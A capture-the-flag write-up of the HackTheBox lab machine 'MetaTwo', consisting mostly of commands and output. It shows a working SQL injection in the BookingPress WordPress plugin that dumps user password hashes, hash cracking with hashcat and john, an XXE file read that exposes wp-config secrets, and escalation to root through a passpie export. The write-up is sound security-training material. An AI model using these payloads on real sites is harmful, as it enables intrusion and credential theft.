---
layout: single
title: Metatwo hackthebox writeup
excerpt: "Easy linux machine in which we exploit a couple wordpress vulneravilties and crack a couple hashes"
date: 2022-12-05
classes: wide
header:
  teaser: /assets/images/metatwo/metatwo_icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - SQL injection
  - ftp
  - wordpress
---

![](/assets/images/metatwo/metatwo.png)

## User flag

```shell
nmap -sS -Pn -n -p- --min-rate 5000 -vv -oN allports 10.10.11.186
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

As always in these easy linux machines there is a webpage to exploit but let's do an in-depth port scan first

```shell
nmap -sCV -p21,22,80 --min-rate 5000 -vv -oN targeted 10.10.11.186
21/tcp open  ftp?    syn-ack ttl 63
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
...80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MetaPress &#8211; Official company site
|_http-generator: WordPress 5.6.2
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST
```

The FTP server is a ProFTPD server, since the version does not appear let's try to run an old exploit with nmap.

```shell
 nmap --script ftp-proftpd-backdoor -p 21 10.10.11.186

PORT   STATE SERVICE
21/tcp open  ftp
```

Ok, now that we know that it isn't vulnerable let's check the webpage. At first, it redirects us to metapress.htb so don't forget to add it to your `/etc/hosts`.

The web uses wordpress so the most common path in this situation is to run wpscan.

```shell
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
...

 [!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8
  ...
 [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure

```

That are the vulnerabilities that I found were the more interesting however we aren't authenticated yet. So as I always say in this situation, **pentest the main functionality!** in this case the events page. If you open burpsuite to intercept the request and pay attention you will find that the page is using a plugin called bookingpress, here is an example

```
GET /wp-content/plugins/bookingpress-appointment-booking/images/data-grid-empty-view-vector.webp HTTP/1.1
```

If you search for exploits for this plugin you will find that it is vulnerable to a SQL injection as seen [here](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357), we also have the *curl* command that we need to execute so let's try it out.

```shell
curl -i -s 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data "action=bookingpress_front_get_category_services&_wpnonce=64c0de5bf7&category_id=33&total_service=-7502) UNION SELECT 1,1,1,1,1,1,1,1,database() -- -"
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 05 Dec 2022 16:10:24 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"1","bookingpress_category_id":"1","bookingpress_service_name":"1","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"1","bookingpress_service_duration_unit":"1","bookingpress_service_description":"1","bookingpress_service_position":"1","bookingpress_servicedate_created":"blog","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]%
```

Ok it works, Next step is to expose some credentials

```shell
curl -i -s 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data "action=bookingpress_front_get_category_services&_wpnonce=64c0de5bf7&category_id=33&total_service=-7502) UNION SELECT 1,1,1,1,1,1,1,1,database() -- -" | tail -n 1 | tr , '\n'
[{"bookingpress_service_id":"1"
"bookingpress_category_id":"1"
"bookingpress_service_name":"1"
"bookingpress_service_price":"$1.00"
"bookingpress_service_duration_val":"1"
"bookingpress_service_duration_unit":"1"
"bookingpress_service_description":"1"
"bookingpress_service_position":"1"
"bookingpress_servicedate_created":"blog"
```

Ok with this information we know the database is called blog.

```shell
curl -i -s 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data "action=bookingpress_front_get_category_services&_wpnonce=64c0de5bf7&category_id=33&total_service=-7502) UNION SELECT 1,1,1,1,1,1,1,1,TABLE_NAME from INFORMATION_SCHEMA.TABLES -- -" | tail -n 1 | tr , '\n' | grep -i user

"bookingpress_servicedate_created":"USER_PRIVILEGES"
"bookingpress_servicedate_created":"USER_STATISTICS"
"bookingpress_servicedate_created":"user_variables"
"bookingpress_servicedate_created":"wp_users"
"bookingpress_servicedate_created":"wp_usermeta"
```

Now we know the name of all tables containing the word user. (**NOTE:** I'm not using the where statement since it doesn't seem to work however I'm supplying that with the grep command)

```shell
curl -i -s 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data "action=bookingpress_front_get_category_services&_wpnonce=64c0de5bf7&category_id=33&total_service=-7502) UNION SELECT 1,1,1,1,1,1,1,1,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS -- -" | tail -n 1 | tr , '\n' | grep -i user

"bookingpress_servicedate_created":"USER"
"bookingpress_servicedate_created":"CPU_USER"
"bookingpress_servicedate_created":"user_login"
"bookingpress_servicedate_created":"user_pass"
"bookingpress_servicedate_created":"user_nicename"
"bookingpress_servicedate_created":"user_email"
"bookingpress_servicedate_created":"user_url"
"bookingpress_servicedate_created":"user_registered"
"bookingpress_servicedate_created":"user_activation_key"
"bookingpress_servicedate_created":"user_status"
"bookingpress_servicedate_created":"bookingpress_wpuser_id"
"bookingpress_servicedate_created":"bookingpress_user_login"
"bookingpress_servicedate_created":"bookingpress_user_status"
"bookingpress_servicedate_created":"bookingpress_user_type"
"bookingpress_servicedate_created":"bookingpress_user_firstname"
"bookingpress_servicedate_created":"bookingpress_user_lastname"
"bookingpress_servicedate_created":"bookingpress_user_email"
"bookingpress_servicedate_created":"bookingpress_user_phone"
"bookingpress_servicedate_created":"bookingpress_user_country_phone"
"bookingpress_servicedate_created":"bookingpress_user_created"
"bookingpress_servicedate_created":"user_id"
```

Ok with this information we should be able to dump the credentials like this

```shell
curl -i -s 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data "action=bookingpress_front_get_category_services&_wpnonce=64c0de5bf7&category_id=33&total_service=-7502) UNION SELECT 1,1,1,1,1,1,user_pass,user_login,1 from blog.wp_users -- -" | tail -n 1 | tr , '\n' | grep -E 'description|position'
"bookingpress_service_description":"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV."
"bookingpress_service_position":"admin"
"bookingpress_service_description":"$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70"
"bookingpress_service_position":"manager"
```

Nice, with this we now have the hashed credentials of both accounts so let's crack them. Also, note these hashes are phppass, you can search for hash types [here](https://hashcat.net/wiki/doku.php?id=example_hashes)


```shell
hashcat -m 400 hashadmin ~/wordlist/rockyou.txt
...
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
...

hashcat -m 400 hashmanager ~/wordlist/rockyou.txt
Hashfile 'hashmanager' on line 1 ($P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70): Token length exception
```

As I expected the admin hash "can't" be cracked and the manager one gave an error, that's because the character `\` is used to escape other characters but we don't need it now so delete and try again

```shell
hashcat -m 400 hashmanager ~/wordlist/rockyou.txt --show
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
```

Ok password found, let's login to the wordpress site to see if we can exploit any of the earlier mentioned vulnerabilities. Well, we can't use the second exploit since we can't create a new post but we can exploit the first one because we can upload media files. Honestly, the payload in the wordpress page didn't work for me however [this one](https://github.com/AssassinUKG/CVE-2021-29447) did.

With this method, I was able to get the wp-config file which had exciting information

```
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Now we have the FTP and MySQL password, let's connect to FTP and see what we can find.

```shell
ftp metapress.htb@metapress.htb
Connected to metapress.htb.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
331 Password required for metapress.htb
Password:
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 0        metapress.htb     4096 Oct  5 14:12 .
drwxr-xr-x   4 0        metapress.htb     4096 Oct  5 14:12 ..
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
226 Transfer complete
ftp> cd mailer
250 CWD command successful
ftp> ls -la
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 .
drwxr-xr-x   4 0        metapress.htb     4096 Oct  5 14:12 ..
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22 18:32 send_email.php
```

If we retrieve the send_email.php file we will find credentials to the ssh and then we can finally retrieve the user flag.

```shell
ssh jnelson@metapress.htb
jnelson@metapress.htb's password:
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Dec  5 16:57:23 2022 from 10.10.16.69
jnelson@meta2:~$
```

# Root flag

Now in the home directory, we find an interesting hidden directory

```shell
jnelson@meta2:~$ ls -la
total 32
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 .
drwxr-xr-x 3 root    root    4096 Oct  5 15:12 ..
lrwxrwxrwx 1 root    root       9 Jun 26 15:59 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26 15:46 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26 15:46 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26 15:46 .profile
-rw-r----- 1 root    jnelson   33 Dec  5 17:20 user.txt
jnelson@meta2:~$ passpie
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
```

We see the passpie directory, passpie is a terminal password manager, let's check the content of the directory.

```shell
jnelson@meta2:~$ cd .passpie/
jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26 13:57 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26 13:58 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
jnelson@meta2:~/.passpie$ cat .keys
...
```

In the .keys file, we find a couple of pgp keys, Honestly, at this point I had no clue how to get the passphrase so I decided to decrypt both pgp keys.

```shell
gpg2john gpg

File gpg
Error: No hash was generated for gpg, ensure that the input file contains a single private key only.
[dasor@archlinux ~/htb/metatwo]$ gpg2john gpg2

File gpg2
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::gpg2
```

The firts one gives an error so I tried the second one.


```shell
john -w:/home/dasor/wordlist/rockyou.txt hash

Passpie:blink182:::Passpie (Auto-generated by Passpie) <passpie@local>::gpg2

1 password hash cracked, 0 left
```

Ok, the last step then, let's get the root password

```shell
jnelson@meta2:~/.passpie$ passpie export ~/pass
Passphrase:
jnelson@meta2:~/.passpie$ cd
jnelson@meta2:~$ cat pass
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0

jnelson@meta2:~$ su
Password:
root@meta2:/home/jnelson# whoami
root
root@meta2:/home/jnelson#
```

That's all, thank you for reading.
